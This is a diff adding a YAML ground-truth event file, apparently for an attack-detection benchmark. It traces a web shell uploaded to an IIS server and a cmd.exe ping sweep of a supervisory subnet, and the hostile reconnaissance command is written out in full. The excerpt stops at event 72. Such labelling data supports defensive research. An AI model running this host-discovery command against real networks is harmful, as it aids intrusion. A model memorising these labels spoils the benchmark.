@@ -1,0 +1,2254 @@
+# frosty_gt1.yaml
+# = frosty_gt_fixed.yaml + 188 individual cmd.exe -> PING.EXE CREATE_PROCESS edges
+#   (recon ping sweep of 192.168.42.0/24 launched by the IIS web shell on CWS-WIN-01).
+# Each ping spawn is enumerated as a distinct CREATE_PROCESS edge per the per-target rule.
+
+events:
+- seq: 1
+  timestamp: '2026-03-09T11:02:35Z'
+  rel: CREATE_PROCESS
+  src: '{00915167-4dd6-7a65-d35e-d86da4fa5089}'
+  dst: '{3005b269-4095-3d3f-329b-364a7c7f4a22}'
+  technique: T0819
+  note: Exploit Public-Facing Application — w3wp.exe (CWS-WIN-01 IIS .NET v4.5, pid=3176) spawns csc.exe to JIT-compile shell.aspx
+    uploaded by attacker (58.16.10.16) via HTTP POST to /internalportal/upload.ashx.
+- seq: 2
+  timestamp: '2026-03-09T11:02:36Z'
+  rel: CREATE_FILE
+  src: '{3005b269-4095-3d3f-329b-364a7c7f4a22}'
+  dst: '{1e918cf0-a458-b3a4-f402-469a2fd242fa}'
+  technique: T0819
+  note: Exploit Public-Facing Application — csc.exe writes App_Web_a2zibtwz.dll to ASP.NET Temporary Files, activating the
+    web shell at /internalportal/uploads/shell.aspx.
+- seq: 3
+  timestamp: '2026-03-09T11:02:37Z'
+  rel: CREATE_PROCESS
+  src: '{00915167-4dd6-7a65-d35e-d86da4fa5089}'
+  dst: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  technique: T0840
+  note: Network Connection Enumeration — web shell executes "cmd.exe /c for /L %%i in (1 1 254) do ping 192.168.42.%%i -n
+    1 -w 100 | find \"Reply\"" to discover live hosts in the Supervisory VLAN (192.168.42.0/24).
+- seq: 4
+  timestamp: '2026-03-09T11:02:37Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{8d7b8088-6895-44ac-1218-c198ac07d36f}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.1 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 5
+  timestamp: '2026-03-09T11:02:37Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{dfce38c6-3115-647a-70c5-8dc7748e760f}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.2 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 6
+  timestamp: '2026-03-09T11:02:37Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{0dc96abf-823d-c8af-f80f-fe8490576428}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.3 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 7
+  timestamp: '2026-03-09T11:02:37Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{8887a4cf-f4bc-da1f-2725-fb00b6d096b3}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.4 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 8
+  timestamp: '2026-03-09T11:02:37Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{8051064c-71c2-6857-da7a-24dd353de4d6}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.5 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 9
+  timestamp: '2026-03-09T11:02:39Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{e582b9d8-b2b1-e978-e2bd-643cd16c26df}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.8 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 10
+  timestamp: '2026-03-09T11:02:39Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{681b73d4-4046-c407-3b34-d64483e174e5}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.9 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 11
+  timestamp: '2026-03-09T11:02:40Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{d94fa002-6be0-fab6-5d8a-34b997385dd4}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.10 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 12
+  timestamp: '2026-03-09T11:02:40Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{8a2870eb-91db-3fb1-bebd-07e6f9058d48}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.11 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 13
+  timestamp: '2026-03-09T11:02:41Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{41cee381-eaf7-a6ce-1f87-d80f7060027d}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.12 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 14
+  timestamp: '2026-03-09T11:02:41Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{a4c3f752-7c01-18fd-a16e-2b229c1e227a}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.13 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 15
+  timestamp: '2026-03-09T11:02:41Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{c9e69f37-70d4-c09a-d94a-13393dfb464f}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.14 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 16
+  timestamp: '2026-03-09T11:02:42Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{e0853c6c-d077-b3d9-639a-74e742e47e48}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.16 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 17
+  timestamp: '2026-03-09T11:02:43Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{c943ed07-8ba1-72e4-ea5e-982ff58fabe5}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.18 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 18
+  timestamp: '2026-03-09T11:02:44Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{0f489751-2b30-0768-67c7-a62a2826d048}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.20 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 19
+  timestamp: '2026-03-09T11:02:44Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{e9e6353f-ff6f-a888-8c50-60c3695390dd}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.21 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 20
+  timestamp: '2026-03-09T11:02:44Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{71e5aa71-a2e3-2a26-26b6-740769c21d64}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.22 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 21
+  timestamp: '2026-03-09T11:02:45Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{49a09664-3c41-a578-0a08-7a466e84bb37}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.24 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 22
+  timestamp: '2026-03-09T11:02:45Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{40e6ed7d-e02e-ef94-1f63-aad7fabc0d9b}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.25 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 23
+  timestamp: '2026-03-09T11:02:46Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{c5b163d7-fd5f-2c54-507e-ab3eaea7f3e0}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.27 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 24
+  timestamp: '2026-03-09T11:02:47Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{801f3664-49c1-1a73-5cb0-661174477ce4}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.28 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 25
+  timestamp: '2026-03-09T11:02:47Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{84a488ec-5828-9413-1d8e-418765fe1fbb}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.29 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 26
+  timestamp: '2026-03-09T11:02:48Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{6ca32f38-cbcc-6a3f-a2b4-05d2d764f74a}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.31 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 27
+  timestamp: '2026-03-09T11:02:49Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{0b6bae13-616e-81e8-2c50-bb20b49f53bc}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.32 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 28
+  timestamp: '2026-03-09T11:02:49Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{6a3feec5-0f48-16c2-1cc7-88790bd36ab3}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.33 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 29
+  timestamp: '2026-03-09T11:02:50Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{75b04596-88ac-4d3c-7c3c-76143e8fb18a}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.34 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 30
+  timestamp: '2026-03-09T11:02:50Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{4bf4cb41-50db-bed7-42da-3d31170acf98}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.35 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 31
+  timestamp: '2026-03-09T11:02:51Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{d6229bb5-b05b-67fb-ffeb-86ecdf48e2bf}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.37 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 32
+  timestamp: '2026-03-09T11:02:52Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{b276d771-340f-330f-918e-56bb9bc71f63}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.39 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 33
+  timestamp: '2026-03-09T11:02:53Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{efd6726a-04ef-6acc-a9e6-a15fa31544a9}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.40 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 34
+  timestamp: '2026-03-09T11:02:53Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{eff23c7b-56bb-d941-5540-270871fa42a2}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.41 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 35
+  timestamp: '2026-03-09T11:02:59Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{ba0101b7-3e3d-cb7a-4c3d-b93dcf0fcff6}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.53 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 36
+  timestamp: '2026-03-09T11:03:01Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{7cf2848d-5466-3ac4-5116-d6dcc2f26b69}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.56 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 37
+  timestamp: '2026-03-09T11:03:01Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{c73f9368-9a34-4b81-b399-b1fbb8f7a647}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.57 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 38
+  timestamp: '2026-03-09T11:03:02Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{e0010a33-f0de-ade8-006a-96ee04b79b3c}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.58 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 39
+  timestamp: '2026-03-09T11:03:02Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{0d25f60e-91a7-6894-b491-57be7f8919b9}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.59 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 40
+  timestamp: '2026-03-09T11:03:03Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{dde8ede9-479f-08cc-d51b-612ac692cb5e}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.60 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 41
+  timestamp: '2026-03-09T11:03:03Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{979f03ec-0f2f-d7f8-7246-39341d8211b5}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.61 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 42
+  timestamp: '2026-03-09T11:03:04Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{deb48190-fd93-d49d-a2e1-3b478abdb39a}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.62 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 43
+  timestamp: '2026-03-09T11:03:05Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{7459c946-510d-d547-232c-64c0e76da0f7}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.65 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 44
+  timestamp: '2026-03-09T11:03:06Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{bc7278df-9dc6-4b96-e7ff-a35c3b01fbc3}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.66 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 45
+  timestamp: '2026-03-09T11:03:07Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{2aa13cae-8394-b2c8-3034-a98265540569}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.68 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 46
+  timestamp: '2026-03-09T11:03:07Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{4c10937f-6062-a648-9ab0-3b5298bee423}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.69 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 47
+  timestamp: '2026-03-09T11:03:10Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{08b18abd-ffec-3c17-88d3-51d4e9d4d33d}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.74 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 48
+  timestamp: '2026-03-09T11:03:16Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{c5606806-8c6b-6127-7122-b3c79640981d}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.86 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 49
+  timestamp: '2026-03-09T11:03:18Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{1e259e13-c0c9-3063-84b8-81c7516902b8}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.90 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 50
+  timestamp: '2026-03-09T11:03:18Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{4d9bc339-c81f-a55b-ad4f-f5563b4aceb6}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.91 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 51
+  timestamp: '2026-03-09T11:03:19Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{512057ce-3515-2fff-8563-8bf8922134de}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.92 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 52
+  timestamp: '2026-03-09T11:03:19Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{7e7f1970-d5e4-c01a-ddee-2a72724d7e3c}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.93 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 53
+  timestamp: '2026-03-09T11:03:20Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{35653f2c-e4a3-942f-34f1-dec311bf3159}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.94 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 54
+  timestamp: '2026-03-09T11:03:20Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{049d5fb4-18ce-2e4f-1728-50268d476f36}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.95 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 55
+  timestamp: '2026-03-09T11:03:23Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{f2d259f9-e5f9-dd84-bd30-878d58f74d4f}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.101 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 56
+  timestamp: '2026-03-09T11:03:24Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{1a4c8637-de05-a1fe-6131-6be201b98985}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.102 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 57
+  timestamp: '2026-03-09T11:03:24Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{2c93e852-7a9c-2176-08e2-80d3331b779d}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.103 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 58
+  timestamp: '2026-03-09T11:03:25Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{b5cf6559-8296-c9ae-3efa-6d457307aa31}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.104 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 59
+  timestamp: '2026-03-09T11:03:25Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{3a441009-a533-4395-8a17-faa16eec3b56}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.105 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 60
+  timestamp: '2026-03-09T11:03:27Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{a852447e-4faa-5e89-e38c-29dc2bf8cafa}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.109 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 61
+  timestamp: '2026-03-09T11:03:29Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{d7e836bf-58b6-2a15-4eeb-90766893629f}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.112 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 62
+  timestamp: '2026-03-09T11:03:29Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{7842a895-843b-3886-4984-341a0a650ac7}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.113 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 63
+  timestamp: '2026-03-09T11:03:30Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{dbbadca8-f489-78de-fc2f-9eb188ca73e6}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.114 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 64
+  timestamp: '2026-03-09T11:03:30Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{d236eb3b-660a-4745-112a-9fdaba000eb2}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.115 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 65
+  timestamp: '2026-03-09T11:03:31Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{8a010606-0ad3-6a49-d34f-555195e3b4a0}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.116 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 66
+  timestamp: '2026-03-09T11:03:31Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{f401c0c5-af70-708f-14a2-b725eb0ef6df}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.117 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 67
+  timestamp: '2026-03-09T11:03:33Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{8400caf9-749e-d6c3-4bee-2b2d331f4dae}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.120 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 68
+  timestamp: '2026-03-09T11:03:35Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{10450477-8184-667d-d630-9b5c70c6f0bf}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.124 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 69
+  timestamp: '2026-03-09T11:03:36Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{e134a6c5-b7d7-05c4-c434-23010df12a3c}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.126 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 70
+  timestamp: '2026-03-09T11:03:36Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{60e6f634-a9db-4506-1ac9-abff6ec8d170}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.127 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 71
+  timestamp: '2026-03-09T11:03:37Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{375af55a-68b7-79a1-0a75-722136ea04b9}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.128 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 72
+  timestamp: '2026-03-09T11:03:38Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{57d2e8bb-5cc3-74f2-18b8-2d85aa0e4595}'
+  technique: T0840
